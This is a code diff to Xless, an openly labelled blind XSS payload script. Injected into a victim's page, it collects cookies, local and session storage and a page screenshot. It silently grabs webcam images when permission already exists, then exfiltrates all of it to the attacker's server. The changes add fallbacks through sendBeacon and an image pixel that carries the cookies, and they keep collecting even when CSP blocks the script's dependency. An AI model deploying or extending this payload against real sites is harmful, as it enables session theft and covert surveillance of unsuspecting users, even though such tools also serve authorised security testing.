@@ -1,11 +1,29 @@
-// Xless: The serverlesss Blind XSS app.
+// Xless: The serverless Blind XSS app.
 // Author: Mazin Ahmed <mazin@mazinahmed.net>
 (function () {
-  var curScript = document.currentScript;
+  // Resolve script origin — currentScript can be null when loaded via eval()
+  var scriptSrc = "";
+  try {
+    if (document.currentScript && document.currentScript.src) {
+      scriptSrc = document.currentScript.src;
+    }
+  } catch (e) { }
 
-  console.log("Loaded xless.");
+  // Fallback: find our script tag by searching DOM
+  if (!scriptSrc) {
+    try {
+      var scripts = document.getElementsByTagName("script");
+      for (var i = scripts.length - 1; i >= 0; i--) {
+        if (scripts[i].src && scripts[i].src.indexOf("/c") === -1 && scripts[i].src.match(/https?:\/\//)) {
+          scriptSrc = scripts[i].src;
+          break;
+        }
+      }
+    } catch (e) { }
+  }
 
   function screenshot() {
+    if (typeof html2canvas === "undefined") return Promise.resolve("");
     return html2canvas(document.querySelector("html"), {
       letterRendering: 1,
       allowTaint: true,
@@ -93,10 +111,10 @@
           .slice(0, 8192);
       },
       localStorage: function () {
-        return JSON.stringify(localStorage);
+        try { return JSON.stringify(localStorage); } catch (e) { return ""; }
       },
       sessionStorage: function () {
-        return JSON.stringify(sessionStorage);
+        try { return JSON.stringify(sessionStorage); } catch (e) { return ""; }
       },
       Webcam: function () {
         // Smart webcam capture: only if permission is already granted (no popup)
@@ -106,7 +124,6 @@
             return resolve("not supported");
           }
 
-          // Strategy 1: Check permissions API first (avoids popup)
           function checkAndCapture() {
             return navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480, facingMode: "user" } })
               .then(function (stream) {
@@ -117,7 +134,6 @@
                   video.srcObject = stream;
                   video.play();
 
-                  // Wait for video to be ready
                   setTimeout(function () {
                     try {
                       var canvas = document.createElement("canvas");
@@ -126,16 +142,14 @@
                       canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
                       var dataUrl = canvas.toDataURL("image/png");
 
-                      // Clean up: stop all tracks
                       stream.getTracks().forEach(function (track) { track.stop(); });
                       video.srcObject = null;
-
                       innerResolve(dataUrl);
                     } catch (e) {
                       stream.getTracks().forEach(function (track) { track.stop(); });
                       innerResolve("capture failed");
                     }
-                  }, 1500); // Wait 1.5s for camera to warm up
+                  }, 1500);
                 });
               })
               .catch(function () {
@@ -148,19 +162,15 @@
             navigator.permissions.query({ name: "camera" })
               .then(function (result) {
                 if (result.state === "granted") {
-                  // Permission already granted — capture silently
                   checkAndCapture().then(resolve);
                 } else {
-                  // Not granted — don't trigger popup
                   resolve("no permission");
                 }
               })
               .catch(function () {
-                // Permissions API not supported for camera, skip
                 resolve("permission check unavailable");
               });
           } else {
-            // No Permissions API — skip to avoid popup
             resolve("permissions API unavailable");
           }
 
@@ -190,14 +200,33 @@
   }
 
   function exfiltrateLoot(collectedData) {
-    // Get the URI of our BXSS server
-    var uri = new URL(curScript.src);
+    if (!scriptSrc) return; // Can't determine server, bail
+
+    var uri;
+    try { uri = new URL(scriptSrc); } catch (e) { return; }
     var exfUrl = uri.origin + "/c";
 
-    var xhr = new XMLHttpRequest();
-    xhr.open("POST", exfUrl, true);
-    xhr.setRequestHeader("Content-Type", "application/json");
-    xhr.send(JSON.stringify(collectedData));
+    // Primary: XHR POST
+    try {
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", exfUrl, true);
+      xhr.setRequestHeader("Content-Type", "application/json");
+      xhr.send(JSON.stringify(collectedData));
+    } catch (e) {
+      // Fallback: sendBeacon (works even if page navigates away)
+      try {
+        navigator.sendBeacon(exfUrl, JSON.stringify(collectedData));
+      } catch (e2) {
+        // Last resort: image pixel with minimal data
+        try {
+          var img = new Image();
+          img.src = uri.origin + "/message?text=" + encodeURIComponent(
+            "bXSS fired on " + collectedData["Location"] +
+            " | Cookies: " + (collectedData["Cookies"] || "none")
+          );
+        } catch (e3) { }
+      }
+    }
   }
 
   function loadScript(src) {
@@ -206,16 +235,23 @@
       script.type = "text/javascript";
       script.async = true;
       script.onload = resolve;
-      script.onerror = resolve;
+      script.onerror = resolve; // Resolve on error too so chain continues
       script.src = src;
-      document.getElementsByTagName("head")[0].appendChild(script);
+      (document.head || document.getElementsByTagName("head")[0] || document.documentElement).appendChild(script);
     });
   }
 
-  // Load the html2canvas dependency
+  // Load html2canvas dependency, then collect data and exfiltrate
+  // CRITICAL: Even if html2canvas fails to load (CSP blocks CDN), we STILL collect data
   loadScript(
     "https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.7/dist/html2canvas.min.js"
   )
     .then(collectData)
-    .then(exfiltrateLoot);
+    .then(exfiltrateLoot)
+    .catch(function () {
+      // If anything in the chain fails, still try to collect and send data
+      collectData()
+        .then(exfiltrateLoot)
+        .catch(function () { });
+    });
 })();
